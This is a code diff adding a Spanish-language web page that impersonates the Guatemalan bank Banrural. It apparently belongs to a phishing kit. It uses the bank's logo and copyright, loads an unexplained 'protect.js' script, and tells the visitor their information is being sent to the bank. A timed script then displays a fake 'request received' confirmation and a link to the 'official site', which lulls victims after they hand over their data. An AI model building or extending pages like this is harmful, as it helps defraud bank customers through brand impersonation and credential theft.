@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Procesando solicitud - Banrural Guatemala</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
+  <script src="protect.js"></script>
+  <style>
+    *{margin:0;padding:0;box-sizing:border-box}
+    body{
+      min-height:100vh;
+      font-family:'Inter',system-ui,-apple-system,Segoe UI,Roboto,sans-serif;
+      background:#f4f5f7;
+      color:#1a1a1a;
+      display:flex;
+      flex-direction:column;
+      align-items:center;
+      justify-content:center;
+      padding:24px;
+    }
+    .card{
+      background:#fff;
+      border-radius:16px;
+      padding:40px 28px;
+      max-width:420px;
+      width:100%;
+      text-align:center;
+      box-shadow:0 8px 32px rgba(6,95,44,0.08);
+      border:1px solid #ececf2;
+    }
+    .logo{
+      height:64px;
+      width:auto;
+      margin:0 auto 22px;
+      display:block;
+    }
+    .spinner{
+      width:56px;height:56px;
+      border:5px solid rgba(6,95,44,0.15);
+      border-top-color:#065f2c;
+      border-radius:50%;
+      animation:spin .9s linear infinite;
+      margin:8px auto 22px;
+    }
+    @keyframes spin{to{transform:rotate(360deg)}}
+    h1{font-size:22px;font-weight:800;margin-bottom:10px;color:#04421a}
+    p{font-size:15px;color:#5e6470;line-height:1.5;margin-bottom:18px}
+    .check{
+      width:64px;height:64px;border-radius:50%;
+      background:#e9f8ee;color:#1d8c44;
+      display:none;align-items:center;justify-content:center;
+      margin:8px auto 18px;
+    }
+    .check svg{width:34px;height:34px}
+    .btn{
+      display:none;
+      align-items:center;justify-content:center;
+      margin:18px auto 0;
+      background:#065f2c;color:#fff;
+      padding:12px 22px;border-radius:10px;
+      font-weight:600;font-size:15px;
+      text-decoration:none;
+      transition:background .15s;
+    }
+    .btn:hover{background:#04421a}
+    .done .spinner{display:none}
+    .done .check,.done .btn{display:inline-flex}
+    .done .processing-text{display:none}
+    .done h1{color:#1d8c44}
+    .note{font-size:12.5px;color:#9aa0aa;margin-top:18px}
+  </style>
+</head>
+<body>
+  <div class="card" id="card">
+    <img src="img/Nuevo_Logo_Banrural.webp" alt="Banrural Guatemala" class="logo" />
+    <div class="spinner" aria-hidden="true"></div>
+    <div class="check" aria-hidden="true">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12l5 5L20 7"/></svg>
+    </div>
+    <h1 id="title">Procesando tu solicitud...</h1>
+    <p class="processing-text">Estamos enviando tu información a Banrural Guatemala. Esto puede tomar unos segundos.</p>
+    <p class="success-text" style="display:none">Tu solicitud fue recibida correctamente. Un asesor de Banrural se pondrá en contacto contigo en las próximas 24 a 48 horas hábiles.</p>
+    <a href="https://www.banrural.com.gt" class="btn">Ir al sitio oficial</a>
+    <p class="note">© 2026 Banco de Desarrollo Rural, S.A. (Banrural).</p>
+  </div>
+  <script>
+    setTimeout(function(){
+      var card=document.getElementById('card');
+      var p=document.querySelector('.processing-text');
+      var s=document.querySelector('.success-text');
+      document.getElementById('title').textContent='¡Solicitud recibida!';
+      card.classList.add('done');
+      if(p) p.style.display='none';
+      if(s) s.style.display='block';
+    }, 3500);
+  </script>
+</body>
+</html>
